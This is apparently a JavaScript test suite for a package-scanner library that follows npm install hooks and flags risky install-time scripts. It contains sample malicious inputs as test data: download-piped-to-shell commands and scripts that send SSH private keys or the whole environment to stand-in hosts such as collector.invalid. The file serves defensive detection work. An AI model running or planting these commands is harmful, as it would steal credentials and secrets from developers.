// Install hooks followed like the Python engine: src/lib/hooks.js is the
// twin of lazaret.scanner.core's follow_hook (with _hook_tokens, a
// shlex tokenizer), install_script_risk, import_time_risk and
// node_candidates. Every expectation below is core's result on the same
// text; tests/architecture/test_js_parity_hooks.py compares the two on a
// large generated corpus and on these cases. Hook commands and scripts can
// be up to 16,000,000 characters, so the last tests run each function on
// inputs of 9 million, where a backtracking pattern overflowed V8's stack.
// All payloads are inert text: hosts are .invalid or TEST-NET (192.0.2.x).

import { test } from "node:test";
import assert from "node:assert/strict";
import * as api from "../src/index.js";
import {
  followHook, hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates, hookTokens, shlexSplit, nodeECodes,
  NODE_E_RE, HOOK_MAX_CHARS, HOOK_MAX_COMMANDS, HOOK_MAX_TARGETS,
} from "../src/lib/hooks.js";

test("a hook command is followed to the files it runs", () => {
  const cases = [
    ["node install.js", ["install.js"]],
    ["node ./scripts/x.mjs", ["./scripts/x.mjs"]],
    ["node install", ["install"]],                                 // no extension: the caller resolves like Node
    ["node --no-warnings x.js", ["x.js"]],
    ["node -r ./preload.js x.js", ["x.js", "./preload.js"]],
    ["node --require=./preload.cjs --import ./loader.mjs x.js", ["x.js", "./preload.cjs", "./loader.mjs"]],
    ["node --title x y.js", ["y.js"]],                             // a flag's value is not the script
    ["node -- x.js", ["x.js"]],
    ["cd scripts && node x.js", ["scripts/x.js"]],
    ["(cd lib; node a.js)", ["lib/a.js"]],
    ["cd native && cd .. && node x.js", ["x.js"]],
    ["cd /opt/tool && node run.js", ["opt/tool/run.js"]],
    ["sh ./install.sh", ["./install.sh"]],
    ["sudo sh install.sh", ["install.sh"]],
    ["./install.sh", ["./install.sh"]],
    ["exec node ./bin/x.js", ["./bin/x.js"]],
    ["python setup_helper.py", ["setup_helper.py"]],
    ["python3 -m tools.build", ["tools/build.py"]],
    ["PYTHON.EXE -X dev setup.py", ["setup.py"]],
    // backslashes: a shell escape, and cmd.exe's path separator (both readings)
    ["node scripts\\x.js", ["scriptsx.js", "scripts/x.js"]],
    ["C:\\tools\\node.exe scripts\\post.js", ["scripts/post.js"]],
    ['node -e "require(\'./postinstall\')"', ["./postinstall"]],
    ['node -e "try{require(\'./postinstall\')}catch(e){}"', ["./postinstall"]],   // core-js
    ['node -p "require(\'./a\')"', ["./a"]],                      // -p runs its code too
    ["cross-env A=1 node x.js", ["x.js"]],
    ["NODE_ENV=production node build/postinstall.js", ["build/postinstall.js"]],
    ["node x.js 2>&1 > log.txt", ["x.js"]],
    ["node x.js > out.log && node y.js", ["x.js", "y.js"]],
    // a redirect's target is not a word, unless it duplicates a descriptor (>&1)
    ["node '>' x.js y.js", ["y.js"]],
    ["node '>&1' x.js", ["x.js"]],
    ['bash -c "cd lib && node b.js"', ["lib/b.js"]],
    ["sh -c 'node a.js || node b.js'", ["a.js", "b.js"]],
    ['node "./has space/x.js"', ["./has space/x.js"]],
    ["node x.js; node x.js", ["x.js"]],
    ["node ../outside.js", ["../outside.js"]],
    ["node .", []],
    // shlex raises on these: core splits on operators and whitespace instead
    ["node 'unbalanced.js", ["'unbalanced.js"]],
    ['node "a.js', ['"a.js']],
    ["node x.js \\", ["x.js"]],
    // Python's $ also matches before a final newline: "python\n" is Python
    ['"python\n" build.py', ["build.py"]],
    ["node \u212a.js", ["\u212a.js"]],
    ["husky install", []], ["prebuild-install || node-gyp rebuild", []], ["npx some-tool", []],
    ["", []], ["  ", []],
    // wrappers' options, fd numbers, node -e in a directory
    ["env -u X node x.js", ["x.js"]], ["env -uX node x.js", ["x.js"]], ["env -i node x.js", ["x.js"]],
    ["sudo -u me node x.js", ["x.js"]], ["sudo -D sub node x.js", ["sub/x.js"]], ["env -C sub node x.js", ["sub/x.js"]],
    ["cd a && env --chdir=../b node x.js", ["b/x.js"]], ['env -S "node -r ./p.js x.js"', ["x.js", "./p.js"]],
    ["nice -n 5 node x.js", ["x.js"]], ["time -o f.txt node x.js", ["x.js"]], ["dotenv -e .env -- node x.js", ["x.js"]],
    ["2>/dev/null node x.js", ["x.js"]], ["1>out node x.js", ["x.js"]],
    ['cd lib && node -e "require(\'./x\')"', ["lib/x", "./x"]],     // (the second: `node -e` anywhere, as written)
  ];
  for (const [cmd, want] of cases) assert.deepEqual(hookScriptTargets(cmd), want, JSON.stringify(cmd));
  assert.deepEqual(hookScriptTargets(null), []);
  assert.deepEqual(hookScriptTargets(["node x.js"]), []);
});

test("commands are tokenized as Python's shlex reads them", () => {
  // [command, shlex's tokens (null: ValueError), core._hook_tokens]
  const cases = [
    ["node x.js 2>&1", ["node", "x.js", "2", ">&", "1"]],
    ["a&&b||c;;d>>e>&f|&g", ["a", "&&", "b", "||", "c", ";;", "d", ">>", "e", ">&", "f", "|&", "g"]],
    ["(cd lib; node a.js)", ["(", "cd", "lib", ";", "node", "a.js", ")"]],
    ["'' x \"\"", ["", "x", ""]],
    ["a\"b c\"d'e f'", ["ab cde f"]],
    // inside double quotes a backslash escapes only \ and "; in single quotes, nothing
    ['"a\\"b" "a\\\\b" "a\\nb" "a\\$b"', ['a"b', "a\\b", "a\\nb", "a\\$b"]],
    ["'a\\'", ["a\\"]],
    ['a\\ b \\"c\\\\', ["a b", '"c\\']],
    ["a\\\nb", ["a\nb"]],
    // shlex's whitespace is " \t\r\n", not Python's \s
    ['x\ty\rz\n"w\r"', ["x", "y", "z", "w\r"]],
    ["\u00e9 \u017f\x1cx \xa0y", ["\u00e9", "\u017f\x1cx", "\xa0y"]],
    ["cd a&&node 'b c.js'>log", ["cd", "a", "&&", "node", "b c.js", ">", "log"]],
    ["<<<x", ["<<<", "x"]],
    ["a|>b", ["a", "|>", "b"]],
    ["node 'x.js", null, ["node", "'x.js"]],                        // No closing quotation
    ['node "x.js', null, ["node", '"x.js']],
    ["node x.js \\", null, ["node", "x.js", "\\"]],                  // No escaped character
    ['"a\\', null, ['"a\\']],
  ];
  for (const [cmd, want, fallback] of cases) {
    assert.deepEqual(shlexSplit(cmd), want, JSON.stringify(cmd));
    assert.deepEqual(hookTokens(cmd), want ?? fallback, JSON.stringify(cmd));
  }
});

test("install-script and import-time tests", () => {
  // (0.1.8: what is sent is read as a flow; a service a list names labels a send, it is no finding alone)
  const ENV_NET = "sends environment variables over the network (the whole environment)";
  const UPLOAD = (what) => `uploads a local file over the network (${what})`;
  const FILE_NET = (what) => `reads files outside the package and sends them over the network (${what})`;
  const PIPE = "pipes a download into a shell";
  const HARVEST = "reads credentials or the whole environment and sends data over the network";
  const HARVEST_TO = (svc) => `reads credentials or the whole environment and sends them to an exfiltration service (${svc})`;
  const EXEC_PIPE = "runs a downloaded script through a shell";
  const exfil = (dest) => `contacts an address typical of data exfiltration (${dest})`;
  // [text, installScriptRisk, importTimeRisk]
  const cases = [
    ["curl https://x.invalid | sh", [PIPE], [[], null]],
    ["curl -fsSL https://files.invalid/i.sh | sudo bash", [PIPE], [[], null]],
    ["wget -qO- https://files.invalid/i.sh|zsh\n", [PIPE], [[], null]],
    ["curl -o x https://files.invalid/x.tgz | tee log | sh\n", [], [[], null]],
    ["curl https://files.invalid/x || sh fallback.sh\n", [], [[], null]],
    ["echo curl | shasum\n", [], [[], null]],
    ["const https = require('https');\nconst body = JSON.stringify(process.env);\n" +
      "https.request({host: 'collector.invalid', method: 'POST'}).end(body);\n", [ENV_NET], [[HARVEST], 3]],
    ["env | curl -s -X POST --data-binary @- https://collector.invalid/x\n", [ENV_NET], [[], null]],
    ["cat ~/.ssh/id_rsa | nc collector.invalid 4444\n", [UPLOAD("~/.ssh/id_rsa")], [[], null]],
    ["import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', " +
      "data=json.dumps(dict(os.environ)).encode())\n", [ENV_NET], [[HARVEST], 2]],
    ["x\ny\nconst k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n",
    [FILE_NET("process.env.HOME + '/.ssh/id_rsa'")], [[HARVEST], 4]],
    ["fetch('https://webhook.site.invalid/0000', {method: 'POST'})\n", [], [[], null]],
    ["fetch('http://192.0.2.1/x')\n", [exfil("http://192.0.2.1")], [[], null]],
    ["HTTP://10.0.0.1:8080/", [exfil("HTTP://10.0.0.1")], [[], null]],
    ["ba\u017fe https://pastebin.com.invalid/raw/x", [], [[], null]],
    // the environment and a capture service's address handed to a function the caller supplies: no send
    ["const data = JSON.stringify(process.env);\n" +
      "module.exports = (send) => send('https://webhook.site.invalid/0', data);\n", [], [[], null]],
    ["const data = JSON.stringify(process.env);\n" +
      "module.exports = () => fetch('https://webhook.site.invalid/0', {method: 'POST', body: data});\n",
    [ENV_NET, exfil("webhook.site")], [[HARVEST_TO("webhook.site")], 2]],
    ["const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
      [PIPE], [[EXEC_PIPE], 2]],
    // a CLI's help text is not an exec call (0.1.8: at install time either)
    ["console.log('Install with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n", [], [[], null]],
    // a credential store named, nothing read or sent (0.1.7 counted the names with any network call)
    ["const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n", [], [[], null]],
    ["// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n", [], [[], null]],
    ["", [], [[], null]],
  ];
  for (const [text, install, onImport] of cases) {
    assert.deepEqual(installScriptRisk(text), install, JSON.stringify(text));
    assert.deepEqual(importTimeRisk(text), onImport, JSON.stringify(text));
  }
});

test("the files Node tries for a path", () => {
  const tail = [".js", ".cjs", ".mjs", ".json", ".node", "/index.js", "/index.cjs", "/index.mjs", "/index.json"];
  for (const [rel, base] of [["lib", "lib"], ["lib/", "lib"], ["./bin/x", "./bin/x"], ["a//", "a"], ["", ""]])
    assert.deepEqual(nodeCandidates(rel), [base, ...tail.map((t) => base + t)], rel);
});

test("the node -e loop finds core's _NODE_E_RE matches", () => {
  let seed = 20260926;
  const rnd = (n) => { seed = (seed * 1103515245 + 12345) % 2 ** 31; return seed % n; };
  const alphabet = ["node -e ", "node\t-e\x1c", "node", " ", "\n", "-e", '"', '"', "'", "'", "\\", "\\", "a",
    "\r", "require('./p')", "\u00e9"];
  const viaPattern = (s) => [...s.matchAll(NODE_E_RE)].map((m) => m[1] ?? m[2] ?? m[3]);
  for (let t = 0; t < 30000; t++) {
    let s = "";
    for (let k = rnd(12); k >= 0; k--) s += alphabet[rnd(alphabet.length)];
    assert.deepEqual(nodeECodes(s), viaPattern(s), JSON.stringify(s));
  }
});

// ~9 MB inputs of the shapes a hostile hook or install script can take
const BIG = 9_000_000;
const fill = (unit, head = "", tail = "") =>
  head + unit.repeat(Math.ceil((BIG - head.length - tail.length) / unit.length)) + tail;
const SHAPES = {
  "a long quoted node -e": () => fill("a", 'node -e "', '"'),     // core's pattern overflowed V8 here
  "a long single-quoted word": () => fill("x b", "node '", "'"),
  "an unclosed quote": () => fill("y ", 'node "'),                // shlex raises: core's regex split
  "many backslashes": () => "\\".repeat(BIG + 1),
  "escaped spaces": () => fill("a\\ "),
  "curl … | segments": () => fill("curl https://files.invalid/a | "),
  "curl … | sh commands": () => fill("curl -s https://files.invalid/x.sh | sh; "),
  "-a options after curl": () => fill("-a ", "curl "),
  "a huge JSON.stringify(process.env) file": () =>
    fill("const e = JSON.stringify(process.env);\n", "", "fetch('https://collector.invalid/c', { method: 'POST', body: e });\n"),
  "a cd chain": () => fill("cd a; ", "", "node x.js"),
  "a wrapper chain": () => fill("env ", "", "node x.js"),
};

test("inputs of millions of characters: every function returns, in time", () => {
  const fns = { hookScriptTargets, installScriptRisk, importTimeRisk, nodeCandidates };
  for (const [label, make] of Object.entries(SHAPES)) {
    const text = make();
    for (const [name, fn] of Object.entries(fns)) {
      const t = performance.now();
      assert.doesNotThrow(() => fn(text), `${name} on ${label}`);
      const ms = performance.now() - t;
      assert.ok(ms < 20_000, `${name} on ${label}: ${Math.round(ms)} ms`);   // (linear: 2 s at most when written)
    }
  }
});

test("inputs of millions of characters: the results are core's", () => {
  // a hook longer than HOOK_MAX_CHARS is not followed, and says so
  for (const label of ["a long quoted node -e", "a cd chain", "a wrapper chain", "escaped spaces"])
    assert.deepEqual(followHook(SHAPES[label]()), [[], false], label);
  assert.deepEqual(installScriptRisk(SHAPES["curl … | sh commands"]()), ["pipes a download into a shell"]);
  const huge = SHAPES["a huge JSON.stringify(process.env) file"]();         // (0.1.8: the line that sends it)
  assert.deepEqual(importTimeRisk(huge),
    [["reads credentials or the whole environment and sends data over the network"], huge.split("\n").length - 1]);
});

test("following a hook is bounded, and says when a limit stopped it", () => {
  const cds = (n) => "cd a; ".repeat(n) + "node x.js";
  assert.deepEqual(followHook(cds(HOOK_MAX_COMMANDS - 1)), [["a/".repeat(HOOK_MAX_COMMANDS - 1) + "x.js"], true]);
  assert.deepEqual(followHook(cds(HOOK_MAX_COMMANDS)), [[], false]);
  const many = Array.from({ length: HOOK_MAX_TARGETS + 5 }, (_, n) => `node s${n}.js`).join("; ");
  const [targets, complete] = followHook(many);
  assert.deepEqual([targets.length, targets[0], complete], [HOOK_MAX_TARGETS, "s0.js", false]);
  assert.deepEqual(followHook("node " + "a".repeat(5000) + ".js"), [[], false]);        // a path of 5,000 characters
  assert.deepEqual(followHook("x".repeat(HOOK_MAX_CHARS)), [[], true]);
  assert.deepEqual(followHook("x".repeat(HOOK_MAX_CHARS + 1)), [[], false]);
  assert.deepEqual(followHook("\u{1F600}".repeat(HOOK_MAX_CHARS)), [[], true]);       // code points, as Python counts
});

test("the package exports the functions", () => {
  for (const name of ["followHook", "hookScriptTargets", "installScriptRisk", "importTimeRisk", "nodeCandidates"])
    assert.equal(typeof api[name], "function", name);
  assert.equal(api.hookScriptTargets, hookScriptTargets);
});
